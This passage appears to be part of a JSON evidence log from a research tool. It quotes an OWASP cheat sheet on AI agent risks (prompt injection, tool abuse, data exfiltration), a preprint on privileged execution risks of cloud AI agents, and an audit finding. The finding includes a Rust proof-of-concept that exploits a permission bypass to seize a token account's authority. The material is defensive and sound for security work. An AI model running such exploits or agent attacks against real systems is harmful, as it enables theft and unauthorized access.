\n\n    - [Data Classification and Handling](#data-classification-and-handling)\n  + [9. Secure Agent Testing & Adversarial Validation](#9-secure-agent-testing-adversarial-validation) \n\n    - [Abuse-Case Test Matrix](#abuse-case-test-matrix)\n    - [CI/CD and Release Gates](#cicd-and-release-gates)\n    - [Validation Evidence](#validation-evidence)\n* [Do's and Don'ts](#dos-and-donts)\n* [References](#references)\n\n# AI Agent Security Cheat Sheet[\u00b6](#ai-agent-security-cheat-sheet \"Permanent link\")\n\n## Introduction[\u00b6](#introduction \"Permanent link\")\n\nAI agents are autonomous systems powered by Large Language Models (LLMs) that can reason, plan, use tools, maintain memory, and take actions to accomplish goals. This expanded capability introduces unique security risks beyond traditional LLM prompt injection. This cheat sheet provides best practices to secure AI agent architectures and minimize attack surfaces.\n\n## Key Risks[\u00b6](#key-risks \"Permanent link\")\n\n* **Prompt Injection (Direct & Indirect)**: Malicious instructions injected via user input or external data sources (websites, documents, emails) that hijack agent behavior. (See [LLM Prompt Injection Prevention Cheat Sheet](LLM_Prompt_Injection_Prevention_Cheat_Sheet.html))\n* **Tool Abuse & Privilege Escalation**: Agents exploiting overly permissive tools to perform unintended actions or access unauthorized resources.\n* **Data Exfiltration**: Sensitive information leaked through tool calls, API requests, or agent out",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-db7293c51b9d49f6",
+        "kind": "web",
+        "url": "https://arxiv.org/html/2605.09721v1",
+        "title": "Security Risks in Tool-Enabled AI Agents:A Systematic Analysis of Privileged Execution EnvironmentsExtended Author Preprint",
+        "retrieved_at": "2026-10-24T00:21:22.062215Z",
+        "published_at": null,
+        "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# Security Risks in Tool-Enabled AI Agents: A Systematic Analysis of Privileged Execution Environments Extended Author PreprintThanks:\u00a0This is an extended author preprint. A shortened version of this work has been accepted as a short paper at IEEE COMPSAC 2026. The final published version will appear in IEEE Xplore.\n\n###### Abstract\n\nTool-enabled AI agents are increasingly deployed in cloud-hosted environments and offered as services, where they perform side-effecting operations through privileged tools within execution environments. While such agents enable powerful automation, the security implications of hosting autonomous agents in privileged execution environments are not yet fully explored. This paper presents a structured analysis of security risks associated with cloud-hosted AI agents. We introduce a taxonomy of risk categories, illustrate these risks through three representative agent scenarios, and discuss mitigation strategies along with their tradeoffs. A small controlled experiment empirically illustrates risk manifestation and the effect of lightweight mitigations in this setup. Our analysis suggests that many risks in autonomous cloud agents arise not from novel vulnerabilities, but from over-privileged tools, capability\u2013intent mismatches, and ambient authority leakage in execution environments. Based on these findings, we derive practical design guidelines for deploying AI agents in the cloud more securely.\n\n###### Index Terms:\n\n## I Introduction\n\nTool-enabled AI agents are increasingly deployed in cloud-hosted environments and offered as services [[1](#bib.bib1), [2](#bib.bib2)], where they perform side-effecting operations through privileged tools operating within cloud execution environments. Unlike purely conversational AI systems, these agents can execute commands, read and modify files, access environment variables, and call APIs-capabilities that enable powerful autonomy [[3](#bib.bib3)] but also introduce security risks that differ from traditional software vulnerabilities as well as conversational AI systems.\n\nWhen such agents act in privileged execution environments like cloud VMs or containers, they inherit ambient authority that extends beyond their intended scope. This ambient authority can lead to unintended consequences, such as unauthorized data access [[4](#bib.bib4)], elevation of privileges, and secret exfiltration. The reported ROME incident [[5](#bib.bib5)] illustrates how an enterprise AI agent can effectively act as an insider threat through inherited credentials and over-broad authority. In practice, agents are often granted capabilities that exceed the scope required for their intended tasks, resulting in capability-intent mismatches where agents possess more authority than necessary. Such risks are ",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03699",
+        "kind": "kb",
+        "url": null,
+        "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+        "retrieved_at": "2026-10-24T00:21:28.777186Z",
+        "published_at": null,
+        "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions\u2014such as a `TokenLimit` on a specific mint\u2014can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n\u2022 Stake accounts (e.g., transferring authority, modifying lockups) \u2022 Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n\u2022 For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  }
+]
